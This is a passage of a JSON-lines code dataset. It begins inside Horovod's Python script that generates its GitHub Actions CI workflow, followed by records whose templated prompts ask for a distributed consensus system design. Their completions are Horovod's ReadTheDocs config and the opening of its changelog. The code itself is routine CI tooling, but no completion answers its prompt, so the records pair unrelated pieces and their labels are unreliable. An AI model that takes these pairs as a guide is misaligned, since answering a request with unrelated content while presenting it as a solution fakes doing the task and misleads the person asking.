matrix.image }}}})\"\\n'\n                f'    needs: [{\", \".join(needs)}]\\n'\n                f'    if: >\\n'\n                f\"      needs.init-workflow.outputs.run-at-all == 'true' &&\\n\"\n                f\"      needs.init-workflow.outputs.run-builds-and-tests == 'true'\\n\"\n                f'    runs-on: ubuntu-latest\\n'\n                f'\\n'\n                f'    strategy:\\n'\n                f'      max-parallel: {parallel_images}\\n'\n                f'      fail-fast: false\\n'\n                f'      matrix:\\n'\n                f'        include:\\n' +\n                '\\n'.join([f'          - image: {image}\\n' +\n                           f''.join([f'            {test}: true\\n'\n                                     for test in sorted(list(tests_per_image.get(image, [])))]) +\n                           f'            build_timeout: {30 if \"-cpu-\" in image else 40}\\n'\n                           for image in sorted(images)\n                           # oneccl does not compile on GitHub Workflows:\n                           # https://github.com/horovod/horovod/issues/2846\n                           if '-oneccl-' not in image]) +\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Clean up disk space\\n'\n                f'        # deleting these paths frees 38 GB disk space:\\n'\n                f'        #   sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc\\n'\n                f'        # but this sometimes takes 3-4 minutes\\n'\n                f'        # so we delete only some sub-paths which are known to be quick (10s) and 20 GB\\n'\n                f'        run: |\\n'\n                f'          echo ::group::Disk space before clean up\\n'\n                f'          df -h\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'          for dir in /usr/share/dotnet/sdk/\\*/nuGetPackagesArchive.lzma \\\\\\n'\n                f'                     /usr/share/dotnet/shared \\\\\\n'\n                f'                     /usr/local/lib/android/sdk/ndk \\\\\\n'\n                f'                     /usr/local/lib/android/sdk/build-tools \\\\\\n'\n                f'                     /opt/ghc\\n'\n                f'          do\\n'\n                f'            echo ::group::Deleting \"$dir\"\\n'\n                f'            sudo du -hsc $dir | tail -n1 || true\\n'\n                f'            sudo rm -rf $dir\\n'\n                f'            echo ::endgroup::\\n'\n                f'          done\\n'\n                f'\\n'\n                f'          echo ::group::Disk space after clean up\\n'\n                f'          df -h\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'      - name: Checkout\\n'\n                f'        uses: actions/checkout@v4\\n'\n                f'        with:\\n'\n                f'          submodules: recursive\\n'\n                f'\\n'\n                f'      - name: Setup Python\\n'\n                f'        uses: actions/setup-python@v5\\n'\n                f'        with:\\n'\n                f'          python-version: 3.8\\n'\n                f'\\n'\n                f'      - name: Build\\n'\n                f'        id: build\\n'\n                f'        run: |\\n'\n                f'          .github/timeout-and-retry.sh ${{{{ matrix.build_timeout }}}}m 3 10 docker compose -f docker-compose.test.yml build ${{{{ matrix.image }}}}\\n'\n                f'        env:\\n'\n                f'          COMPOSE_DOCKER_CLI_BUILD: 1\\n'\n                f'          DOCKER_BUILDKIT: 1\\n'\n                f'\\n' +\n                '\\n'.join([f'      - name: \"{test[\"label\"]} [attempt {attempt} of {attempts}]\"\\n'\n                           f'        id: {test_id}_run_{attempt}\\n'\n                           f'        continue-on-error: {\"true\" if attempt < attempts else \"false\"}\\n'\n                           f'        if: always() && steps.build.outcome == \\'success\\' && matrix.{test_id} && {\"true\" if attempt == 1 else f\"steps.{test_id}_run_{attempt-1}.outcome == {failure}\"}\\n'\n                           f'        run: |\\n'\n                           f'          mkdir -p artifacts/${{{{ matrix.image }}}}/{test_id}_run_{attempt}\\n'\n                           f'          docker compose -f docker-compose.test.yml run -e GITHUB_ACTIONS --rm --volume \"$(pwd)/artifacts/${{{{ matrix.image }}}}/{test_id}_run_{attempt}:/artifacts\" ${{{{ matrix.image }}}} /usr/bin/timeout {test[\"timeout\"]}m {test[\"command\"]}\\n'\n                           f'        shell: bash\\n'\n                           for test_id, test in sorted(tests.items(), key=lambda test: test[0])\n                           for attempt in range(1, attempts+1)]) +\n                f'\\n'\n                f'      - name: Upload Test Results\\n'\n                f'        uses: actions/upload-artifact@v4\\n'\n                f'        if: always() && contains(matrix.image, \\'-cpu-\\')\\n'\n                f'        with:\\n'\n                f'          name: Unit Test Results - ${{{{ matrix.image }}}}\\n'\n                f'          path: artifacts/${{{{ matrix.image }}}}/**/*.xml\\n')\n\n    def build_and_test_macos(id: str, name: str, needs: List[str], attempts: int = 3) -> str:\n        if 'init-workflow' not in needs:\n            needs.insert(0, 'init-workflow')\n        failure = \"'failure'\"\n        return (f'  {id}:\\n'\n                f'    name: \"{name} (${{{{ matrix.image }}}}-macos)\"\\n'\n                f'    needs: [{\", \".join(needs)}]\\n'\n                f'    if: >\\n'\n                f\"      needs.init-workflow.outputs.run-at-all == 'true' &&\\n\"\n                f\"      needs.init-workflow.outputs.run-builds-and-tests == 'true'\\n\"\n                f'    runs-on: macos-11\\n'\n                f'\\n'\n                f'    strategy:\\n'\n                f'      max-parallel: 3\\n'\n                f'      fail-fast: false\\n'\n                f'      matrix:\\n'\n                f'        include:\\n'\n                f''\n                f'          - image: test-cpu-openmpi-py3_7-tf1_15_5-keras2_2_4-torch1_6_0-mxnet1_5_1_p0\\n'\n                f'            HOROVOD_WITH_MPI: 1\\n'\n                f'            HOROVOD_WITHOUT_GLOO: 1\\n'\n                f'            TENSORFLOW: 1.15.0\\n'\n                f'            KERAS: 2.2.4\\n'\n                f'            PYTORCH: 1.6.0\\n'\n                f'            PYTORCH_LIGHTNING: 1.3.8\\n'\n                f'            TORCHVISION: 0.7.0\\n'\n                f'            MXNET: 1.5.1.post0\\n'\n                f'\\n'\n                f''  # mxnet 1.8.0.post0 does not compile for macos due to missing dnnl_config.h\n                f'          - image: test-cpu-gloo-py3_8-tf2_9_2-keras2_9_0-torch1_11_0-mxnet1_7_0_p2\\n'\n                f'            HOROVOD_WITHOUT_MPI: 1\\n'\n                f'            HOROVOD_WITH_GLOO: 1\\n'\n                f'            TENSORFLOW: 2.9.2\\n'\n                f'            KERAS: 2.9.0\\n'\n                f'            PYTORCH: 1.11.0\\n'\n                f'            PYTORCH_LIGHTNING: 1.5.9\\n'\n                f'            TORCHVISION: 0.12.0\\n'\n                f'            MXNET: 1.7.0.post2\\n'\n                f'\\n'\n                f'          - image: test-openmpi-cpu-gloo-py3_8-tf2_10_0-keras2_10_0-torch1_12_1-mxnet1_9_1\\n'\n                f'            HOROVOD_WITH_MPI: 1\\n'\n                f'            HOROVOD_WITH_GLOO: 1\\n'\n                f'            TENSORFLOW: 2.10.0\\n'\n                f'            KERAS: 2.10.0\\n'\n                f'            PYTORCH: 1.12.1\\n'\n                f'            PYTORCH_LIGHTNING: 1.5.9\\n'\n                f'            TORCHVISION: 0.13.1\\n'\n                f'            MXNET: 1.9.1\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Checkout\\n'\n                f'        uses: actions/checkout@v4\\n'\n                f'        with:\\n'\n                f'          submodules: recursive\\n'\n                f'\\n'\n                f'      - name: Build\\n'\n                f'        id: build\\n'\n                f'        env:\\n'\n                f'          HOROVOD_WITH_MPI: ${{{{ matrix.HOROVOD_WITH_MPI }}}}\\n'\n                f'          HOROVOD_WITHOUT_MPI: ${{{{ matrix.HOROVOD_WITHOUT_MPI }}}}\\n'\n                f'          HOROVOD_WITH_GLOO: ${{{{ matrix.HOROVOD_WITH_GLOO }}}}\\n'\n                f'          HOROVOD_WITHOUT_GLOO: ${{{{ matrix.HOROVOD_WITHOUT_GLOO }}}}\\n'\n                f'          TENSORFLOW: ${{{{ matrix.TENSORFLOW }}}}\\n'\n                f'          KERAS: ${{{{ matrix.KERAS }}}}\\n'\n                f'          PYTORCH: ${{{{ matrix.PYTORCH }}}}\\n'\n                f'          PYTORCH_LIGHTNING: ${{{{ matrix.PYTORCH_LIGHTNING }}}}\\n'\n                f'          TORCHVISION: ${{{{ matrix.TORCHVISION }}}}\\n'\n                f'          MXNET: ${{{{ matrix.MXNET }}}}\\n'\n                f'\\n'\n                f'        # The python patch in the pyenv install step is to work around an incompatibility introduced in new xcode version in macOS Big Sur. The patch is provided by python team.\\n'\n                f'        # The original discussion is here https://github.com/pyenv/pyenv/issues/1737\\n'\n                f'        run: |\\n'\n                f'          brew reinstall -f zlib bzip2\\n'\n                f'          brew install -f openmpi cmake libuv pyenv coreutils curl\\n'\n                f'          export PATH=$(pyenv root)/shims:$PATH\\n'\n                f'          pyenv uninstall -f 3.7.7\\n'\n                f'          CFLAGS=\"-I$(brew --prefix bzip2)/include -I$(brew --prefix zlib)/include\" LDFLAGS=\"-L$(brew --prefix zlib)/lib -L$(brew --prefix bzip2)/lib\" pyenv install --patch 3.7.7 < <(curl -sSL https://github.com/python/cpython/commit/8ea6353.patch)\\n'\n                f'          pyenv global 3.7.7\\n'\n                f'          python --version\\n'\n                f'\\n'\n                f'          python -m pip install -U pip\\n'\n                f'          pip install tensorflow==${{TENSORFLOW}} keras==${{KERAS}}\\n'\n                f'          if [[ ${{TENSORFLOW}} == 1.* ]] || [[ ${{TENSORFLOW}} == 2.[012345].* ]]; then pip install \"h5py<3\" \"protobuf~=3.20\"; fi\\n'\n                f'          pip install torch==${{PYTORCH}} pytorch_lightning==${{PYTORCH_LIGHTNING}} torchvision==${{TORCHVISION}}\\n'\n                f'          pip install mxnet==${{MXNET}}\\n'\n                f'          HOROVOD_WITH_TENSORFLOW=1 HOROVOD_WITH_PYTORCH=1 HOROVOD_WITH_MXNET=1 pip install --no-cache-dir .[test]\\n'\n                f'          horovodrun --check-build\\n'\n                f'\\n' +\n                '\\n'.join([f'      - name: Test [attempt {attempt} of {attempts}]\\n'\n                           f'        id: test-{attempt}\\n'\n                           f'        continue-on-error: {\"true\" if attempt < attempts else \"false\"}\\n'\n                           f'        if: always() && steps.build.outcome == \\'success\\' && {\"true\" if attempt == 1 else f\"steps.test-{attempt-1}.outcome == {failure}\"}\\n'\n                           f'\\n'\n                           f'        run: |\\n'\n                           f'          export PATH=$(pyenv root)/shims:$PATH\\n'\n                           f'          pyenv global 3.7.7\\n'\n                           f'          python --version\\n'\n                           f'\\n'\n                           f'          artifacts_path=\"$(pwd)/artifacts/${{{{ matrix.image }}}}-macos-run-{attempt}\"\\n'\n                           f'          mkdir -p \"$artifacts_path\"\\n'\n                           f'          echo \"artifacts-path=$artifacts_path\" >> $GITHUB_OUTPUT\\n'\n                           f'          echo pytest -v --capture=no --continue-on-collection-errors --junit-xml=$artifacts_path/junit.\\$1.\\${{HOROVOD_RANK:-\\${{OMPI_COMM_WORLD_RANK:-\\${{PMI_RANK}}}}}}.\\$2.xml \\${{@:2}} > pytest.sh\\n'\n                           f'          chmod u+x pytest.sh\\n'\n                           f'\\n'\n                           f'          cd test/parallel\\n'\n                           f'          ls test_*.py | gtimeout 10m xargs -n 1 horovodrun -np 2 /bin/bash ../../pytest.sh macos\\n'\n                           for attempt in range(1, attempts+1)]) +\n                f'\\n'\n                f'      - name: Upload Test Results\\n'\n                f'        uses: actions/upload-artifact@v4\\n'\n                f'        if: always()\\n'\n                f'        with:\\n'\n                f'          name: Unit Test Results - ${{{{ matrix.image }}}}-macos\\n'\n                f'          path: |\\n' +\n                '\\n'.join([f'            ${{{{ steps.test-{attempt}.outputs.artifacts-path }}}}'\n                           for attempt in range(1, attempts+1)]))\n\n    def trigger_buildkite_job(id: str, name: str, needs: List[str], mode: str) -> str:\n        if 'init-workflow' not in needs:\n            needs.insert(0, 'init-workflow')\n        return (f'  {id}-trigger:\\n'\n                f'    name: \"{name} (trigger Builtkite)\"\\n'\n                f'    needs: [{\", \".join(needs)}]\\n'\n                f'    runs-on: ubuntu-latest\\n'\n                f'    if: >\\n'\n                f'      github.repository == \\'horovod/horovod\\' &&\\n'\n                f\"      needs.init-workflow.outputs.run-at-all == 'true' &&\\n\"\n                f\"      needs.init-workflow.outputs.run-builds-and-tests == 'true' &&\\n\"\n                f'      ( github.event_name != \\'pull_request\\' || github.event.pull_request.head.repo.full_name == github.repository )\\n'\n                f'    outputs:\\n'\n                f'      url: ${{{{ steps.build.outputs.url }}}}\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Trigger Buildkite Pipeline\\n'\n                f'        id: build\\n'\n                f'        uses: buildkite/trigger-pipeline-action@v1.3.1\\n'\n                f'        env:\\n'\n                f'          PIPELINE: \"horovod/horovod\"\\n'\n                f'          # COMMIT is taken from GITHUB_SHA\\n'\n                f'          BRANCH: \"${{{{ needs.init-workflow.outputs.buildkite-branch-label }}}} ({mode})\"\\n'\n                f'          # empty MESSAGE will be filled by Buildkite from commit message\\n'\n                f'          MESSAGE: \"${{{{ needs.init-workflow.outputs.buildkite-message }}}}\"\\n'\n                f'          BUILDKITE_API_ACCESS_TOKEN: ${{{{ secrets.BUILDKITE_TOKEN }}}}\\n'\n                f'          BUILD_ENV_VARS: \"{{\\\\\"PIPELINE_MODE\\\\\": \\\\\"{mode}\\\\\"}}\"\\n'\n                f'\\n'\n                f'  {id}:\\n'\n                f'    name: \"{name} (download Builtkite)\"\\n'\n                f'    needs: [{id}-trigger]\\n'\n                f'    runs-on: ubuntu-latest\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Download Buildkite Artifacts\\n'\n                f'        id: download\\n'\n                f'        uses: EnricoMi/download-buildkite-artifact-action@v1\\n'\n                f'        with:\\n'\n                f'          buildkite_token: ${{{{ secrets.BUILDKITE_TOKEN }}}}\\n'\n                f'          buildkite_build_url: ${{{{ needs.{id}-trigger.outputs.url }}}}\\n'\n                f'          ignore_build_states: blocked,canceled,skipped,not_run\\n'\n                f'          ignore_job_states: timed_out\\n'\n                f'          output_path: artifacts/Unit Test Results - {mode} on Builtkite\\n'\n                f'\\n'\n                f'      - name: Upload Test Results\\n'\n                f'        uses: actions/upload-artifact@v4\\n'\n                f'        if: always()\\n'\n                f'        with:\\n'\n                f'          name: Unit Test Results - {mode} on Builtkite\\n'\n                f'          path: artifacts/Unit Test Results - {mode} on Builtkite/**/*.xml\\n' +\n                f'\\n'\n                f'      - name: Check Buildkite job state\\n'\n                f'        if: >\\n'\n                f'          always() &&\\n'\n                f'          steps.download.conclusion == \\'success\\' &&\\n'\n                f'          steps.download.outputs.build-state != \\'passed\\'\\n'\n                f'        run: |\\n'\n                f'          echo \"::warning::Buildkite pipeline did not pass: ${{{{ needs.{id}-trigger.outputs.url }}}}\"\\n'\n                f'          exit 1\\n')\n\n    def publish_docker_images(needs: List[str], images: List[str]) -> str:\n        if 'init-workflow' not in needs:\n            needs.insert(0, 'init-workflow')\n        if needs != ['init-workflow', 'build-and-test', 'buildkite']:\n            raise RuntimeError('This job has hard-coded needs, which you may want to adjust')\n        return (f'  docker-config:\\n'\n                f'    name: Configure docker build\\n'\n                f'    needs: [{\", \".join(needs)}]\\n'\n                f\"    # build-and-test and buildkite might have been skipped (! needs.init-workflow.outputs.run-builds-and-tests)\\n\"\n                f'    # buildkite might have been skipped (workflow runs for a fork PR),\\n'\n                f'    # we still want to build docker images (though we might not want to push them)\\n'\n                f'    if: >\\n'\n                f'      always() &&\\n'\n                f\"      needs.init-workflow.outputs.run-at-all == 'true' &&\\n\"\n                f\"      needs.init-workflow.outputs.run-builds-and-tests == 'true' &&\\n\"\n                f\"      needs.build-and-test.result == 'success' &&\\n\"\n                f\"      ( needs.buildkite.result == 'success' || needs.buildkite.result == 'skipped' )\\n\"\n                f'    runs-on: ubuntu-latest\\n'\n                f'    outputs:\\n'\n                f'      run: ${{{{ steps.config.outputs.run }}}}\\n'\n                f'      push: ${{{{ steps.config.outputs.push }}}}\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Config\\n'\n                f'        id: config\\n'\n                f'        env:\\n'\n                f'          # run workflow for all events on Horovod repo and non-schedule events on forks\\n'\n                f'          run: ${{{{ github.repository == \\'horovod/horovod\\' || github.event_name != \\'schedule\\' }}}}\\n'\n                f'          # push images only from Horovod repo and for schedule and push events\\n'\n                f'          push: ${{{{ github.repository == \\'horovod/horovod\\' && contains(\\'schedule,push\\', github.event_name) }}}}\\n'\n                f'        run: |\\n'\n                f'          echo Repository: ${{{{ github.repository }}}}\\n'\n                f'          echo Event: ${{{{ github.event_name }}}}\\n'\n                f'          echo Run: $run\\n'\n                f'          echo \"run=$run\" >> $GITHUB_OUTPUT\\n'\n                f'          echo Push: $push\\n'\n                f'          echo \"push=$push\" >> $GITHUB_OUTPUT\\n'\n                f'\\n'\n                f'  docker-build:\\n'\n                f'    name: Build docker image ${{{{ matrix.docker-image }}}} (push=${{{{ needs.docker-config.outputs.push }}}})\\n'\n                f'    needs: docker-config\\n'\n                f'    if: always() && needs.docker-config.outputs.run == \\'true\\'\\n'\n                f'    runs-on: ubuntu-latest\\n'\n                f'\\n'\n                f'    # we want an ongoing run of this workflow to be canceled by a later commit\\n'\n                f'    # so that there is only one concurrent run of this workflow for each branch\\n'\n                f'    concurrency:\\n'\n                f'      # github.ref means something like refs/heads/master or refs/tags/v0.22.1 or the branch.\\n'\n                f'      # This helps to not cancel concurrent runs on master and a tag that share the same commit\\n'\n                f'      # head_ref refers to the pull request branch so we run only one workflow for the given pull request.\\n'\n                f'      # On master, head_ref is empty, so we use the SHA of the commit, this means\\n'\n                f'      # commits to master will not be cancelled, which is important to ensure\\n'\n                f'      # that every commit to master is full tested and deployed.\\n'\n                f'      group: docker-${{{{ matrix.docker-image }}}}-${{{{ github.ref }}}}-${{{{ github.head_ref || github.sha }}}}\\n'\n                f'      cancel-in-progress: true\\n'\n                f'\\n'\n                f'    strategy:\\n'\n                f'      fail-fast: false\\n'\n                f'      matrix:\\n'\n                f'        docker-image:\\n' +\n                ''.join([f'          - {image}\\n'\n                         for image in images]) +\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Checkout\\n'\n                f'        uses: actions/checkout@v4\\n'\n                f'        with:\\n'\n                f'          submodules: \\'recursive\\'\\n'\n                f'\\n'\n                f'      - name: Docker meta\\n'\n                f'        id: meta\\n'\n                f'        uses: crazy-max/ghaction-docker-meta@v5\\n'\n                f'        with:\\n'\n                f'          # list of Docker images to use as base name for tags\\n'\n                f'          images: |\\n'\n                f'            horovod/${{{{ matrix.docker-image }}}}\\n'\n                f'          # generate Docker tags based on the following events/attributes\\n'\n                f'          tags: |\\n'\n                f'            type=schedule\\n'\n                f'            type=ref,event=branch\\n'\n                f'            type=ref,event=pr\\n'\n                f'            type=semver,pattern={{{{version}}}}\\n'\n                f'            type=semver,pattern={{{{major}}}}.{{{{minor}}}}\\n'\n                f'            type=semver,pattern={{{{major}}}}\\n'\n                f'            type=sha\\n'\n                f'\\n'\n                f'      - name: Set up Docker Buildx\\n'\n                f'        uses: docker/setup-buildx-action@v3\\n'\n                f'        with:\\n'\n                f'          driver: docker\\n'\n                f'\\n'\n                f'      - name: Login to DockerHub\\n'\n                f'        if: needs.docker-config.outputs.push == \\'true\\'\\n'\n                f'        uses: docker/login-action@v3\\n'\n                f'        with:\\n'\n                f'          username: ${{{{ secrets.DOCKERHUB_USERNAME }}}}\\n'\n                f'          password: ${{{{ secrets.DOCKERHUB_TOKEN }}}}\\n'\n                f'\\n'\n                f'      - name: Clean up disk space\\n'\n                f'        # deleting these paths frees 38 GB disk space:\\n'\n                f'        #   sudo rm -rf /usr/share/dotnet /usr/local/lib/android /opt/ghc\\n'\n                f'        # but this sometimes takes 3-4 minutes\\n'\n                f'        # so we delete only some sub-paths which are known to be quick (10s) and 20 GB\\n'\n                f'        run: |\\n'\n                f'          echo ::group::Disk space before clean up\\n'\n                f'          df -h\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'          for dir in /usr/share/dotnet/sdk/\\*/nuGetPackagesArchive.lzma \\\\\\n'\n                f'                     /usr/share/dotnet/shared \\\\\\n'\n                f'                     /usr/local/lib/android/sdk/ndk \\\\\\n'\n                f'                     /usr/local/lib/android/sdk/build-tools \\\\\\n'\n                f'                     /opt/ghc\\n'\n                f'          do\\n'\n                f'            echo ::group::Deleting \"$dir\"\\n'\n                f'            sudo du -hsc $dir | tail -n1 || true\\n'\n                f'            sudo rm -rf $dir\\n'\n                f'            echo ::endgroup::\\n'\n                f'          done\\n'\n                f'\\n'\n                f'          echo ::group::Disk space after clean up\\n'\n                f'          df -h\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'      - name: Build image\\n'\n                f'        id: build\\n'\n                f'        uses: docker/build-push-action@v5\\n'\n                f'        timeout-minutes: 60\\n'\n                f'        with:\\n'\n                f'          context: .\\n'\n                f'          file: ./docker/${{{{ matrix.docker-image }}}}/Dockerfile\\n'\n                f'          pull: true\\n'\n                f'          push: false\\n'\n                f'          load: true\\n'\n                f'          tags: horovod-test\\n' +\n                f'          outputs: type=docker\\n' +\n                f'\\n'\n                f'      - name: List image\\n'\n                f'        run: |\\n'\n                f'          docker image ls horovod-test\\n' +\n                f'\\n'\n                f'      - name: Prepare container for test\\n'\n                f'        run: |\\n'\n                f'          grep \"RUN sed\" Dockerfile.test.cpu | sed \"s/^RUN //\" | docker run -i --name horovod-test horovod-test:latest /bin/bash\\n' +\n                ''.join([\n                    f'\\n' +\n                    f\"      - name: Test image ({framework} {comm})\\n\" +\n                    f'        if: always() && steps.build.outcome == \\'success\\'' + (' && matrix.docker-image != \\'horovod-ray\\'' if comm == 'mpi' or 'mxnet' in example else '') + '\\n' +\n                    f'        run: |\\n' +\n                    f'          docker start -ai horovod-test <<<\"{example}\"\\n'\n                    for comm in ['gloo', 'mpi']\n                    for example in ([\n                        f'python /horovod/examples/pytorch/pytorch_mnist.py --data-dir /data/pytorch_datasets --num-proc 2 --hosts localhost:2 --communication {comm}',\n                        f'python /horovod/examples/tensorflow2/tensorflow2_keras_mnist.py 2 localhost:2 {comm}',\n                    ])\n                    for framework in [re.sub('\\/.*', '', re.sub('.*\\/examples\\/', '', example))]\n                ]) +\n                f'\\n'\n                f'      - name: Push image\\n'\n                f'        if: needs.docker-config.outputs.push == \\'true\\'\\n'\n                f'        uses: docker/build-push-action@v5\\n'\n                f'        timeout-minutes: 60\\n'\n                f'        with:\\n'\n                f'          context: .\\n'\n                f'          file: ./docker/${{{{ matrix.docker-image }}}}/Dockerfile\\n'\n                f'          push: ${{{{ needs.docker-config.outputs.push }}}}\\n'\n                f'          tags: ${{{{ steps.meta.outputs.tags }}}}\\n'\n                f'          labels: ${{{{ steps.meta.outputs.labels }}}}\\n'\n                f'\\n'\n                f'      - name: Show free space\\n'\n                f'        if: always()\\n'\n                f'        run: |\\n'\n                f'          echo ::group::Disk Space\\n'\n                f'          df -h\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'          echo ::group::Docker Space\\n'\n                f'          docker system df\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'          echo ::group::Docker Images\\n'\n                f'          docker images -a\\n'\n                f'          echo ::endgroup::\\n'\n                f'\\n'\n                f'          echo ::group::Docker Container\\n'\n                f'          docker container list -a\\n'\n                f'          echo ::endgroup::\\n')\n\n    def sync_files(needs: List[str]) -> str:\n        return (f'  sync-files:\\n'\n                f'    name: \"Sync Files (${{{{ matrix.name }}}})\"\\n'\n                f'    needs: [{\", \".join(needs)}]\\n'\n                f'    runs-on: ubuntu-latest\\n'\n                f'\\n'\n                f'    strategy:\\n'\n                f'      fail-fast: false\\n'\n                f'      matrix:\\n'\n                f'        include:\\n'\n                f'          - name: Docs Summary\\n'\n                f'            left_file: README.rst\\n'\n                f'            right_file: docs/summary.rst\\n'\n                f'            init: sed -i -e s/docs\\///g README.rst\\n'\n                f'\\n'\n                f'          - name: Examples Keras Spark3\\n'\n                f'            left_file: examples/spark/keras/keras_spark_rossmann_run.py\\n'\n                f'            right_file: examples/spark/keras/keras_spark3_rossmann.py\\n'\n                f'\\n'\n                f'    steps:\\n'\n                f'      - name: Checkout\\n'\n                f'        uses: actions/checkout@v4\\n'\n                f'\\n'\n                f'      - name: Diffing ${{{{ matrix.left_file }}}} with ${{{{ matrix.right_file }}}}\\n'\n                f'        env:\\n'\n                f'          LEFT: ${{{{ matrix.left_file }}}}\\n'\n                f'          RIGHT: ${{{{ matrix.right_file }}}}\\n'\n                f'          INIT: ${{{{ matrix.init }}}}\\n'\n                f'        run: |\\n'\n                f'          $INIT\\n'\n                f'\\n'\n                f'          patch --quiet -p0 $LEFT ${{RIGHT}}.patch -o ${{LEFT}}.expected\\n'\n                f'          if ! diff -q ${{LEFT}}.expected --label $LEFT $RIGHT\\n'\n                f'          then\\n'\n                f'            echo\\n'\n                f'            echo \"::error::Files are out-of-sync: $LEFT vs. $RIGHT\"\\n'\n                f'            echo \"Unexpected differences are:\"\\n'\n                f'            diff ${{LEFT}}.expected --label $LEFT $RIGHT || true\\n'\n                f'\\n'\n                f'            echo\\n'\n                f'            echo \"Use the following as ${{RIGHT}}.patch to accept those changes:\"\\n'\n                f'            diff $LEFT $RIGHT || true\\n'\n                f'\\n'\n                f'            false\\n'\n                f'          fi\\n')\n\n    with open(path.joinpath('workflows', 'ci.yaml').absolute(), 'wt') as w:\n        mins = ['tfmin', 'torchmin', 'mxnetmin']\n        heads = ['tfhead', 'torchhead', 'mxnethead']\n        allmin_images = [image for image in images if all(min in image for min in mins)]\n        allhead_images = [image for image in images if all(head in image for head in heads)]\n        release_images = [image for image in images if image not in allhead_images + allmin_images]\n        cpu_release_images = [image for image in release_images if '-cpu-' in image]\n        gpu_release_images = [image for image in release_images if '-gpu-' in image or '-mixed-' in image]\n        workflow = workflow_header() + jobs(\n            init_workflow_job(),\n            # changing these names require changes in the workflow-conclusion step in ci-results.yaml\n            build_and_test_images(id='build-and-test', name='Build and Test', needs=['init-workflow'], images=release_images, parallel_images=len(cpu_release_images), tests_per_image=tests_per_image, tests=tests),\n            build_and_test_images(id='build-and-test-heads', name='Build and Test heads', needs=['build-and-test'], images=allhead_images, tests_per_image=tests_per_image, tests=tests),\n            build_and_test_images(id='build-mins', name='Build mins', needs=['build-and-test'], images=allmin_images, tests_per_image=tests_per_image, tests={}),\n            build_and_test_macos(id='build-and-test-macos', name='Build and Test macOS', needs=['build-and-test']),\n            trigger_buildkite_job(id='buildkite', name='Build and Test GPU', needs=['build-and-test'], mode='GPU NON HEADS'),\n            trigger_buildkite_job(id='buildkite-heads', name='Build and Test GPU heads', needs=['build-and-test'], mode='GPU HEADS'),\n            publish_docker_images(needs=['build-and-test', 'buildkite'], images=['horovod', 'horovod-cpu', 'horovod-nvtabular', 'horovod-ray']),\n            sync_files(needs=['init-workflow'])\n        )\n        print(workflow, file=w, end='')\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": ".github/gen-workflow-ci.py", "language": "python", "complexity": "complex", "star_count": 14555, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 831}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2019 Uber Technologies, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n#\n# ReadTheDocs.io build configuration: supply addition pip install options\n# See https://docs.readthedocs.io/en/stable/config-file/v2.html for details\n#\nversion: 2\n\nbuild:\n  os: ubuntu-22.04\n  tools:\n    python: \"3.8\"\n\n# Build documentation in the docs/ directory with Sphinx\nsphinx:\n  configuration: docs/conf.py\n  fail_on_warning: true\n\n# Don't build any extra formats\nformats: []\n\n# Requirements for building docs\npython:\n  install:\n    - requirements: docs/requirements.txt\n", "metadata": {"source": "github.com/horovod/horovod", "file_path": ".readthedocs.yaml", "language": "yaml", "complexity": "simple", "star_count": 14555, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 38}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Changelog\n\nAll notable changes to this project will be documented in this file.\n\nThe format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/).\n\n## [Unreleased] - YYYY-MM-DD\n\n### Added\n\n### Changed\n\n### Deprecated\n\n### Removed\n\n### Fixed\n\n\n## [v0.28.1] - 2023-06-12\n\n### Fixed\n\n- Fixed build with gcc 12. ([#3925](https://github.com/horovod/horovod/pull/3925))\n- PyTorch: Fixed build on ROCm. ([#3928](https://github.com/horovod/horovod/pull/3928))\n- TensorFlow: Fixed local_rank_op. ([#3940](https://github.com/horovod/horovod/pull/3940))\n\n\n## [v0.28.0] - 2023-05-10\n\n### Added\n\n- TensorFlow: Added new `get_local_and_global_gradients` to PartialDistributedGradientTape to retrieve local and non-local gradients separately. ([#3859](https://github.com/horovod/horovod/pull/3859))\n\n### Changed\n\n- Improved reducescatter performance by allocating output tensors before enqueuing the operation. 